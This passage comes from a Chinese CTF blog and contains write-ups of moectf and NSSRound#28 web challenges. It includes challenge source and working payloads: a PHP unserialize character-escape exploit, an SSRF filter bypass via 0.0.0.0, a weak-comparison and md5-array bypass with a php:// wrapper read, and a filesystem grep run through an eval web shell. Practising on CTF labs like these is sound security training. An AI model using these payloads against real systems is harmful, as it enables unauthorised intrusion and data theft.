<span class="keyword">return</span> <span class="variable">$move</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Omg_It_Is_So_Cool_Bring_Me_My_Flag</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Chant</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Spear_Owner</span> = <span class="string">&#x27;Nobody&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$chant</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;Chant = <span class="variable">$chant</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;Spear_Owner = <span class="string">&#x27;Nobody&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;Spear_Owner !== <span class="string">&#x27;MaoLei&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Far away from COOL...&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Omg You&#x27;re So COOOOOL!!! &quot;</span> . <span class="title function_ invoke__">getenv</span>(<span class="string">&#x27;FLAG&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>å†çœ‹çœ‹è¿™ä¸ª<code>Hanxin.exe.php</code><br><code>Deadly_Thirteen_Spears</code>æœ‰ä¸€ä¸ªç§æœ‰æ•°ç»„ï¼Œè¿™è¿™é‡Œå­˜å‚¨çš„æ˜¯æ¯æªçš„åå­—Make_a_Moveå‡½æ•°æ¥å—ä¸€ä¸ª<code>$move</code>å‡½æ•°ï¼Œä¼šæŠŠé‡Œé¢çš„ç¬¬xæªè½¬æ¢æˆå¯¹åº”çš„çœŸå®åå­—<br>Omg_It_Is_So_Cool_Bring_Me_My_Flagç±»æ¥å—<code>chant</code>å‚æ•°ï¼Œä¼šæŠŠ<code>$this-&gt;Chant</code>å‚æ•°èµ‹å€¼æˆä¼ å…¥çš„å€¼ï¼Œæœ€åå¦‚æœ<code>$this -&gt; Spear_Owner</code>æ˜¯<code>Maolei</code>å°±æ˜¯èƒ½å¾—åˆ°flag</p>
<p>æ€»çš„æ¥çœ‹ï¼ŒSpear_Owneræ˜¯ç¨‹åºé‡Œé¢ç¡®å®šçš„ï¼Œæˆ‘ä»¬èƒ½æ§åˆ¶çš„æ˜¯Chantï¼Œæ‰€ä»¥çŒœæµ‹æ˜¯ç”¨çš„ååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸ï¼Œå› ä¸ºè¿˜æœ‰ä¸€ä¸ªmoveå‡½æ•°ä¼šæ›¿æ¢</p>
<p>è¿™é‡Œæˆ‘ä»¬å…ˆå†™ä¸€ä¸ª<code>Omg_It_Is_So_Cool_Bring_Me_My_Flag</code>ç±»çš„éšä¾¿ä¸€ä¸ªååºåˆ—åŒ–çš„ç»“æœ</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Omg_It_Is_So_Cool_Bring_Me_My_Flag</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Chant</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Spear_Owner</span> = <span class="string">&#x27;Nobody&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$chant</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;Chant = <span class="variable">$chant</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;Spear_Owner = <span class="string">&#x27;Nobody&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;Spear_Owner !== <span class="string">&#x27;MaoLei&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Far away from COOL...&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Omg You&#x27;re So COOOOOL!!! &quot;</span> . <span class="title function_ invoke__">getenv</span>(<span class="string">&#x27;FLAG&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Omg_It_Is_So_Cool_Bring_Me_My_Flag</span>(<span class="string">&quot;di_yi_qiang&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> (<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>ç»“æœæ˜¯</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">O</span>:<span class="number">34</span>:<span class="string">&quot;Omg_It_Is_So_Cool_Bring_Me_My_Flag&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;Chant&quot;</span>;s:<span class="number">11</span>:<span class="string">&quot;di_yi_qiang&quot;</span>;s:<span class="number">11</span>:<span class="string">&quot;Spear_Owner&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;Nobody&quot;</span>;&#125;</span><br></pre></td></tr></table></figure></div>
<p>æˆ‘ä»¬èƒ½æ§åˆ¶çš„å°±æ˜¯è¿™é‡Œçš„â€di_yi_qiangâ€ æ³¨æ„åˆ°â€di_yi_qiangâ€ä¼šè¢«æ›¿æ¢æˆâ€Lovesicknessâ€ ä¹Ÿå°±æ˜¯ä»11ä¸ªå­—ç¬¦æ›¿æ¢æˆäº†12ä¸ªå­—ç¬¦ã€‚<br>è¿™é‡Œæˆ‘ç®€å•è¯´ä¸€ä¸‹ä»€ä¹ˆæ˜¯ååºåˆ—åŒ–çš„å­—ç¬¦é€ƒé€¸ï¼Œååºåˆ—åŒ–ä¸­çš„ç»“æ„æ˜¯ç±»ä¼¼äº<code>s:5:&quot;Chant&quot;</code>5ä»£è¡¨è¿™ä¸ªå‚æ•°çš„é•¿åº¦ï¼Œåé¢è·Ÿç€å‚æ•°å…·ä½“çš„å€¼ï¼Œå½“æ›¿æ¢äº†ä¹‹åäº†ï¼Œæ¯”å¦‚11ä¸ªå­—ç¬¦æ›¿æ¢æˆäº†12ä¸ªå­—ç¬¦ï¼Œè€Œä¸”æ˜¯åœ¨åºåˆ—åŒ–ä¹‹åè¿›è¡Œçš„æ›¿æ¢ï¼Œè¿™æ ·å­å‚æ•°é•¿åº¦(5)æ²¡å˜ï¼Œä½†æ˜¯å‚æ•°è‡ªå·±æœ¬èº«çš„é•¿åº¦å› ä¸ºæ›¿æ¢å‘ç”Ÿäº†æ”¹å˜ï¼Œè€Œååºåˆ—åŒ–çœ‹åˆ°<code>;&#125;</code>å°±å½“ä½œç»“æŸäº†ã€‚æ‰€ä»¥å°±å¯ä»¥è¢«åˆ©ç”¨äº†ã€‚æˆ‘ä»¬é€šè¿‡<code>$chant</code>è¿™ä¸ªå‚æ•°ä¼ å…¥æˆ‘ä»¬æƒ³è¦çš„åºåˆ—åŒ–çš„å€¼ï¼Œç„¶åç¨‹åºåœ¨ååºåˆ—åŒ–æ—¶å€™ä¼šæå‰ç»ˆæ­¢ï¼Œåˆå› ä¸ºè¿›è¡Œè¿‡äº†æ›¿æ¢æ“ä½œï¼Œæ‰€ä»¥å­—ç¬¦é•¿åº¦ä¹Ÿä¼šç¬¦åˆæ¡ä»¶</p>
<p>ç°åœ¨æˆ‘ä»¬æƒ³è¦çš„ååºåˆ—åŒ–çš„å€¼</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">O</span>:<span class="number">34</span>:<span class="string">&quot;Omg_It_Is_So_Cool_Bring_Me_My_Flag&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;Chant&quot;</span>;s:<span class="number">11</span>:<span class="string">&quot;di_yi_qiang&quot;</span>;s:<span class="number">11</span>:<span class="string">&quot;Spear_Owner&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;MaoLei&quot;</span>;&#125;</span><br></pre></td></tr></table></figure></div>
<p>é‚£ç°åœ¨èƒ½æ§åˆ¶çš„æ˜¯è¿™é‡Œçš„â€di_yi_qiangâ€,æ¯æ¬¡æ›¿æ¢ä¹‹åä¼šæ¯”ä¹‹å‰çš„å­—ç¬¦åŠ 1ï¼ˆ12-11ï¼‰<br>æˆ‘ä»¬è¦æ„é€ çš„</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;;s:11:&quot;</span>Spear_Owne<span class="string">r&quot;;s:6:&quot;</span>MaoLei<span class="string">&quot;;&#125;</span></span><br></pre></td></tr></table></figure></div>
<p>ä¸€å…±æ˜¯35ä½ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦æ„é€ 35ä¸ªâ€di_yi_qiangâ€<br>æ‰€ä»¥å‚æ•°é•¿åº¦æ˜¯35 + 35 * 11 &#x3D; 420<br>æ›¿æ¢ä¹‹åå°±æ˜¯</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">O</span>:<span class="number">34</span>:<span class="string">&quot;Omg_It_Is_So_Cool_Bring_Me_My_Flag&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;Chant&quot;</span>;s:<span class="number">420</span>:<span class="number">35</span>ä¸ª<span class="string">&quot;di_yi_qiang&quot;</span>;s:<span class="number">11</span>:<span class="string">&quot;Spear_Owner&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;MaoLei&quot;</span>;&#125;</span><br></pre></td></tr></table></figure></div>
<p>payload</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$post</span> = <span class="string">&#x27;&quot;;s:11:&quot;Spear_Owner&quot;;s:6:&quot;MaoLei&quot;;&#125;&quot;&#x27;</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">1</span>; <span class="variable">$i</span> &lt;= <span class="number">35</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="variable">$post</span> = <span class="string">&quot;di_yi_qiang&quot;</span>.<span class="variable">$post</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$post</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">di_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiang<span class="string">&quot;;s:11:&quot;</span>Spear_Owner<span class="string">&quot;;s:6:&quot;</span>MaoLei<span class="string">&quot;;&#125;</span></span><br></pre></td></tr></table></figure></div>

<p>ä¼ å…¥urlï¼Œå¾—åˆ°flag<br><img src="https://pic1.imgdb.cn/item/67bf03afd0e0a243d40619ae.png"></p>
<h1 id="å½¼å²¸çš„flag"><a href="#å½¼å²¸çš„flag" class="headerlink" title="å½¼å²¸çš„flag"></a>å½¼å²¸çš„flag</h1><p>é¢˜ç›®æè¿°ï¼šæˆ‘ä»¬åœ¨æŸä¸ªå¹³è¡Œå®‡å®™ä¸­å¾—åˆ°äº†ä¸€æ®µ moectf ç¾¤çš„èŠå¤©è®°å½•ï¼Œç²—å¿ƒçš„å‡ºé¢˜äººåœ¨è¿™ä¸ªèŠå¤©å¹³å°ä¸å°å¿ƒæ³„éœ²äº†è‡ªå·±çš„ flag<br>æ ¹æ®é¢˜ç›®æè¿°ï¼Œflagå°±åœ¨è¿™ä¸ªèŠå¤©è®°å½•é‡Œé¢ï¼ŒæŸ¥çœ‹é¡µé¢æºä»£ç ï¼Œç„¶åæœç´¢moectfå°±æ‰¾åˆ°flag<br><img src="https://pic1.imgdb.cn/item/67bf336ed0e0a243d40649bf.png"></p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>web</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>NSSRound#28webæ–¹å‘wp</title>
    <url>/posts/37991.html</url>
    <content><![CDATA[<p>ä¸Šå‘¨æœ«æ‰“çš„nssçš„æ¯”èµ›ï¼Œä¸€å…±å°±4é“webé¢˜ï¼Œæœ€åä¸€é¢˜ä¸ä¼šç”¨fenjingæ²¡åšå‡ºæ¥ã€‚</p>
<span id="more"></span>
<h1 id="ez-ssrf"><a href="#ez-ssrf" class="headerlink" title="ez_ssrf"></a>ez_ssrf</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//flagåœ¨/flagè·¯ç”±ä¸­</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$url</span>, <span class="string">&#x27;http://&#x27;</span>) !== <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([<span class="string">&quot;error&quot;</span> =&gt; <span class="string">&quot;Only http:// URLs are allowed&quot;</span>]);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$host</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>, PHP_URL_HOST);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$ip</span> = <span class="title function_ invoke__">gethostbyname</span>(<span class="variable">$host</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$forbidden_ips</span> = [<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="string">&#x27;::1&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$ip</span>, <span class="variable">$forbidden_ips</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([<span class="string">&quot;error&quot;</span> =&gt; <span class="string">&quot;Access to localhost or 127.0.0.1 is forbidden&quot;</span>]);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$response</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">curl_errno</span>(<span class="variable">$ch</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([<span class="string">&quot;error&quot;</span> =&gt; <span class="title function_ invoke__">curl_error</span>(<span class="variable">$ch</span>)]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$response</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([<span class="string">&quot;error&quot;</span> =&gt; <span class="string">&quot;Please provide a &#x27;url&#x27; parameter&quot;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&#123;<span class="string">&quot;error&quot;</span>:<span class="string">&quot;Please provide a &#x27;url&#x27; parameter&quot;</span>&#125;</span><br></pre></td></tr></table></figure></div>
<p>é¢˜ç›®çš„æ„æ€ä¹Ÿå¾ˆæ˜æ˜¾äº†ï¼Œå°±æ˜¯è€ƒå¯Ÿssrfï¼Œä½†æ˜¯è¿‡æ»¤127.0.0.1å’Œlocalhostï¼Œç”¨å…¶ä»–è¿›åˆ¶ç¼–ç çš„127.0.0.1æˆ–è€…127.1éƒ½ä¸è¡Œï¼Œå°è¯•0.0.0.0å‘ç°å¯ä»¥ï¼Œä¹Ÿæ˜¯ä¸€ç§å¸¸è§çš„ç»•è¿‡æ‰‹æ®µäº† æœ€åçš„payload</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="RUBY"><figure class="iseeu highlight /ruby"><table><tr><td class="code"><pre><span class="line"><span class="string">?u</span>rl=<span class="symbol">http:</span>/<span class="regexp">/0.0.0.0/flag</span></span><br></pre></td></tr></table></figure></div>


<h1 id="ez-php"><a href="#ez-php" class="headerlink" title="ez_php"></a>ez_php</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$a</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">    <span class="variable">$b</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$password</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;password can&#x27;t be a number&lt;/br&gt;&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (<span class="variable">$password</span> != <span class="number">123456</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Wrong password&lt;/br&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$a</span> != <span class="variable">$b</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>) === <span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;wonderful&lt;/br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>]);   <span class="comment"># level2.php</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>ç»™å‡ºæºç ï¼Œå°±æ˜¯ç»™å…ˆç”¨getè¯·æ±‚æ¥å—passwordè¿™ä¸ªå‚æ•°ï¼Œè¿™ä¸ªå‚æ•°ä¸èƒ½æ˜¯æ•°å­—ä½†æ˜¯è¦ç­‰äº123456ï¼Œè¿™é‡Œæ˜¯å¼±ç±»å‹æ¯”è¾ƒï¼Œæ‰€ä»¥å¯ä»¥å†åé¢åŠ ä¸Š%00è¿™ä¸ªç©ºç™½ï¼Œphpåœ¨åˆ¤æ–­çš„æ—¶å€™ä¼šä¸¢å¼ƒè¿™ä¸ªç©ºç™½å°±èƒ½ç»•è¿‡äº†ã€‚ç„¶åabä¸¤ä¸ªmd5å€¼ç›¸åŒè¿™ä¹Ÿæ˜¯å¸¸è§äº†ï¼Œä½†æ˜¯ç›´æ¥ç”¨ä¸¤ä¸ªå­—ç¬¦ä¸²çš„md5å€¼ç›¸åŒåœ¨è¿™é‡Œä¸è¡Œï¼Œæ‰€ä»¥ç”¨æ•°ç»„éƒ½è¿”å›nullã€‚æœ€åç”¨phpä¼ªåè®®å¯ä»¥ç›´æ¥è¯»å‡ºflag(å¬è¯´è¿™æ˜¯éé¢„æœŸè§£ï¼Ÿ)<br><img src="https://pic1.imgdb.cn/item/67e170a90ba3d5a1d7e2b2f9.png"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# echo TlNTQ1RGezQzOTE5NmE0LTUzNjItNDVhNC04NDdiLWZjYjRiOTc1OTFmY30K | base64 -d</span><br><span class="line">NSSCTF&#123;439196a4-5362-45a4-847b-fcb4b97591fc&#125;</span><br></pre></td></tr></table></figure></div>


<h1 id="light-pink"><a href="#light-pink" class="headerlink" title="light_pink"></a>light_pink</h1><p><img src="https://pic1.imgdb.cn/item/67e1718f0ba3d5a1d7e2b320.png"><br>ç»™äº†ä¸€ä¸ªç•™è¨€æ¿ï¼Œé—®ä½ flag è—åœ¨å“ªé‡Œã€‚æ˜¾ç¤ºå°è¯•äº†ä¸€ä¸‹sqlæ³¨å…¥ï¼Œå‘ç°è¢«banäº†ã€‚ç„¶åè¿™é‡Œçš„idè™½ç„¶æœ‰å›æ˜¾ï¼Œä½†æ˜¯ä¹Ÿæ²¡æœ‰sstiæ¼æ´ã€‚ç„¶ååœ¨idæ˜¯å·²ç»å­˜åœ¨çš„1-5çš„æ—¶å€™ä¹Ÿæ‰æœ‰æ•°æ®ã€‚ç”¨bpçˆ†ç ´idæ•°å­—ä¹Ÿæ²¡ç”¨ã€‚<br>åœ¨è¿™ä¸ªç½‘é¡µæ²¡æœ‰ä¿¡æ¯å°±å»å…¶ä»–ç½‘é¡µæ‰¾æ‰¾ï¼Œç›®å½•æ‰«æäº†ä¸€ä¸‹å‘ç°ä¸€ä¸ªshell.php<br><img src="https://pic1.imgdb.cn/item/67e1720d0ba3d5a1d7e2b32e.png"><br>ç«Ÿç„¶ç›´æ¥å¯ä»¥æ‰§è¡Œä»£ç ã€‚è¿™é‡Œç¯å¢ƒå˜é‡ä¸­çš„flagæ˜¯å‡flag<br>ä¸‹ä¸€æ­¥å°±æ˜¯åˆ©ç”¨è¿™é‡Œçš„evalæ‰§è¡Œshellä¸­çš„ä»£ç äº†ï¼Œè¿™å°±åˆ°æˆ‘ä»¬æ‰“é¶æœºçš„äººçš„é•¿å¤„äº†ã€‚è¿™é‡Œåå¼¹shellä¸è¡Œï¼Œå°±ç›´æ¥å¼€æ‰¾å§ åæ­£flagçš„æ ¼å¼è‚¯å®šæ˜¯NSSCTF<br>å…ˆç”¨<code>find / -name &#39;*&#39; -exec grep -H &#39;NSS&#39; &#123;&#125; \; 2&gt;/dev/null </code> è¿™ä¸ªæŒ‡ä»¤çš„æ„æ€æ˜¯ä»æ ¹ç›®å½•&#x2F;å¼€å§‹æ‰¾èµ·ï¼Œ*æ‰¾æ‰€æœ‰çš„æ–‡ä»¶ï¼Œæ¯ä¸ªæ–‡ä»¶éƒ½æ‰§è¡ŒgrepæŒ‡ä»¤ï¼Œgrepæ˜¯ä¸€ä¸ªåŒ¹é…çš„å·¥å…·ï¼Œ-Hè¡¨ç¤ºåªè¾“å‡ºåŒ¹é…çš„å­—ç¬¦ <code>&#123;&#125;</code>æ˜¯ä¸€ä¸ªæ–‡ä»¶å ä½ç¬¦ï¼Œå› ä¸ºgrepå‘½ä»¤éœ€è¦åœ¨ä¸€ä¸ªæ–‡ä»¶é‡Œé¢æ‰¾ï¼Œè¿™é‡Œéƒ½ä»£è¡¨æ‰€æœ‰çš„æ–‡ä»¶<code>*</code>ï¼Œæœ€åå°±å‘ç°flagåœ¨db.sqlé‡Œé¢<br><img src="https://pic1.imgdb.cn/item/67e174ec0ba3d5a1d7e2b513.png"></p>
<h1 id="Coding-Loving"><a href="#Coding-Loving" class="headerlink" title="Coding Loving"></a>Coding Loving</h1><p>è¿™é¢˜ç»™äº†ä¸ªé™„ä»¶ï¼Œç»™äº†é¢˜ç›®çš„æºç </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = <span class="string">&#x27;Cialloï½(âˆ ãƒ»Ï‰ ï¼œï¼‰âŒ’â˜…&#x27;</span></span><br><span class="line">FILTER_KEYWORDS = [<span class="string">&#x27;Cialloï½(âˆ ãƒ»Ï‰ ï¼œï¼‰âŒ’â˜…&#x27;</span>]</span><br><span class="line">TIME_LIMIT = <span class="number">1</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">contains_forbidden_keywords</span>(<span class="params">complaint</span>):</span><br><span class="line">    <span class="keyword">for</span> keyword <span class="keyword">in</span> FILTER_KEYWORDS:</span><br><span class="line">        <span class="keyword">if</span> keyword.lower() <span class="keyword">in</span> complaint:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    session[<span class="string">&#x27;user&#x27;</span>] = <span class="string">&#x27;test&#x27;</span></span><br><span class="line">    command = request.form.get(<span class="string">&#x27;cmd&#x27;</span>, <span class="string">&#x27;coding&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, command=command)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/test&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shell</span>():</span><br><span class="line">    <span class="keyword">if</span> session.get(<span class="string">&#x27;user&#x27;</span>) != <span class="string">&#x27;test&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;Auth.html&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> (abc:=request.headers.get(<span class="string">&#x27;User-Agent&#x27;</span>)) <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;Auth.html&#x27;</span>)</span><br><span class="line">    cmd = request.args.get(<span class="string">&#x27;cmd&#x27;</span>, <span 